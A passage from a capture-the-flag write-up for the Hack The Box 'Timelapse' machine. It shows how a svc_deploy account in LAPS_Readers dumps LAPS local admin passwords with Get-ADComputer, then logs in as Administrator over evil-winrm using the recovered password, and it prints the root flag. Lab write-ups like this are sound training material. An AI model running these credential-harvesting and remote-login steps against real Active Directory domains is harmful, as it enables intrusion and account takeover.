<li>Makes it retrievable only by privileged users or groups (like <code>LAPS_Readers</code>).</li> <li>Being part of <code>LAPS_Readers</code>, <code>svc_deploy</code> can retrieve local admin passwords from AD.</li> </ul> <p>We used the following PowerShell command to extract all computers and their LAPS passwords:</p> <pre><code>*Evil-WinRM* PS C:\\Users\\svc_deploy\\Documents&gt; Get-ADComputer -Filter * -Properties ms-mcs-admpwd,ms-mcs-admpwdexpirationtime\n\n\nDistinguishedName           : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb\nDNSHostName                 : dc01.timelapse.htb\nEnabled                     : True\nms-mcs-admpwd               : vmct)Q3Mo6y5/65iJY{1;ZoO\nms-mcs-admpwdexpirationtime : 134041364447201437\nName                        : DC01\nObjectClass                 : computer\nObjectGUID                  : 6e10b102-6936-41aa-bb98-bed624c9b98f\nSamAccountName              : DC01$\nSID                         : S-1-5-21-671920749-559770252-3318990721-1000\nUserPrincipalName           :\n\nDistinguishedName : CN=DB01,OU=Database,OU=Servers,DC=timelapse,DC=htb\nDNSHostName       :\nEnabled           : True\nName              : DB01\nObjectClass       : computer\nObjectGUID        : d38b3265-230f-47ae-bdcd-f7153da7659d\nSamAccountName    : DB01$\nSID               : S-1-5-21-671920749-559770252-3318990721-1606\nUserPrincipalName :\n\nDistinguishedName : CN=WEB01,OU=Web,OU=Servers,DC=timelapse,DC=htb\nDNSHostName       :\nEnabled           : True\nName              : WEB01\nObjectClass       : computer\nObjectGUID        : 897c7cfe-ba15-4181-8f2c-a74f88952683\nSamAccountName    : WEB01$\nSID               : S-1-5-21-671920749-559770252-3318990721-1607\nUserPrincipalName :\n\nDistinguishedName : CN=DEV01,OU=Dev,OU=Servers,DC=timelapse,DC=htb\nDNSHostName       :\nEnabled           : True\nName              : DEV01\nObjectClass       : computer\nObjectGUID        : 02dc961a-7a60-4ec0-a151-0472768814ca\nSamAccountName    : DEV01$\nSID               : S-1-5-21-671920749-559770252-3318990721-1608\nUserPrincipalName :\n</code></pre> <p>This revealed the password for the domain controller <code>DC01</code>: <code>Administrator:vmct)Q3Mo6y5/65iJY{1;ZoO</code> This is the local Administrator password for the DC.</p> <p>Using the credentials, we authenticated as Administrator:</p> <pre><code>evil-winrm -S -i 10.10.11.152 -u 'Administrator' -p 'vmct)Q3Mo6y5/65iJY{1;ZoO'\n\nEvil-WinRM shell v3.7\n\nWarning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline\n\nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n\nWarning: SSL enabled\n\nInfo: Establishing connection to remote endpoint\n\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt;\n</code></pre> <p>Then we captured the final flag:</p> <pre><code>*Evil-WinRM* PS C:\\Users\\TRX\\Desktop&gt; dir\n\n\n    Directory: C:\\Users\\TRX\\Desktop\n\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n-ar---        9/30/2025   4:14 AM             34 root.txt\n\n\n*Evil-WinRM* PS C:\\Users\\TRX\\Desktop&gt; type root.txt\n3228e81d48155cdec1ec3623370c58f2\n</code></pre> <p>Rooted!</p>"}]}